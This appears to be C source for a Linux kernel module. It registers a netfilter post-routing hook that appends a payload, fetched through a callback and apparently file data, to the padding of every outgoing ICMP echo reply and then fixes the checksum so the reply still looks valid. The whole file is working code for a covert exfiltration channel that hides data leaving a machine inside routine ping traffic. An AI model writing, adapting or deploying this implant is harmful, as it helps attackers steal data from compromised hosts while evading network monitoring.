#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>

#include "netfilter.h"
#include "../net/checksum.h"
#include "../fs/payload_generator.h"

#define ICMPHDR_TIMESTAMP_FIELD_SIZE (8)

static struct nf_hook_ops netfilter_hook;

get_payload_func_t g_get_payload_func = NULL;

/**
 * Implementation of skb_put_data (was introduced in later kernel versions).
 */
static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, unsigned int len)
{
	void *tmp = skb_put(skb, len);
	memcpy(tmp, data, len);
	return tmp;
}

/**
 * This is the netfilter hook function. This function will be invoked whenever a packet is 
 * about to "hit the wire" and to be sent over the network. 
 * 
 * Please note the following:
 *      1.    This function will almost always be called INSIDE THE INTERRUPT CONTEXT of the network
 *          card's interrupt handler, which means that all the rules of that context also applied here. 
 *          Avoid blocking or accessing user-space.
 *      2.    The payload injected to the ICMP packet must be in the packet's padding, otherwise the 
 *          requesting side won't parse the packet as a valid reply, even if the checksum is correct. 
 *      3.    Since we don't have anything smart to do if we fail, every failure in this function will 
 *          cause it to return NF_ACCEPT, telling netfilter that everything is okay and that the packet 
 *          should be transmitted.
 */
unsigned int nf_sendfile_hook(void *priv,
                              struct sk_buff *skb,
                              const struct nf_hook_state *state)
{    
    if (NULL == g_get_payload_func) {
        return NF_ACCEPT;
    }
    
    struct iphdr *ip_layer = ip_hdr(skb);
    if (IPPROTO_ICMP != ip_layer->protocol) {
        // Ignore any non-ICMP packets.
        return NF_ACCEPT;
    }

    struct icmphdr *icmp_layer = icmp_hdr(skb);
    if (ICMP_ECHOREPLY != icmp_layer->type) {
        // Ignore any non-ICMP-reply packets.
        return NF_ACCEPT;
    }

    if (skb_is_nonlinear(skb)) {
        // Non-linear skb may trigger paging - prohibited since we are called in interrupt context.
        // TODO: can be solved by calling skb_copy. fix it.
        return NF_ACCEPT;
    }

    size_t payload_size = 0;
    size_t default_payload_size = get_default_payload_size();

    // Note the GFP_ATOMIC as we are in interrupt context.
    char* payload_data = (char*)kmalloc(default_payload_size, GFP_ATOMIC);
    if (NULL == payload_data) {
        return NF_ACCEPT;
    }

    // Get the payload we wish to send. 
    if (g_get_payload_func(payload_data, &payload_size)) {
        goto clean_payload_data;
    }

    if (0 == payload_size) {
        return NF_ACCEPT;
    }

    // Since we want our payload to be in the packet's padding, we want to 
    // calculate the size of the ICMP packet BEFORE writing the payload to 
    // the skbuff. Otherwise, skb_put_data will update skb->len to include 
    // our payload.
    ssize_t icmp_and_up_size = skb->len - sizeof(struct iphdr);

    if (payload_size > skb_tailroom(skb)) {
        // If we do not have enough space for our payload, we want to increase the
        // skb's tailroom by the needed amount.
        if (pskb_expand_head(skb, 0, (payload_size - skb_tailroom(skb)), GFP_ATOMIC)) {
            goto clean_payload_data;
        }
    }

    // skb after injecting payload:
    //                              
    //                        skb->len + payload_size        tailroom
    //                  ---------------------------------- ------------
    //                  |                                 |            |
    //      [----------------------------------------------------------]
    //      |           |                       |         |            |
    //      |           |----------------------- ---------             |
    //      |           |    original data        payload              |
    //      |           |                                              |
    //      skb->head   skb->data                                      skb->end
    skb_put_data_impl(skb, payload_data, payload_size);

    icmp_layer->checksum = 0;
    icmp_layer->checksum = icmp_csum((const void *)icmp_layer, icmp_and_up_size);

clean_payload_data:
    kfree(payload_data);

    return NF_ACCEPT;
}

/**
 * register_nf_hook - registeres the netfilter hook.
 */
void register_nf_hook(void)
{
    netfilter_hook.hook = nf_sendfile_hook;
    netfilter_hook.priority = INT_MIN;
    netfilter_hook.hooknum = NF_INET_POST_ROUTING;
    netfilter_hook.pf = PF_INET;

    nf_register_net_hook(&init_net, &netfilter_hook);
}

/**
 * unregister_nf_hook - unregisteres the netfilter hook.
 */
void unregister_nf_hook(void)
{
    nf_unregister_net_hook(&init_net, &netfilter_hook);
}
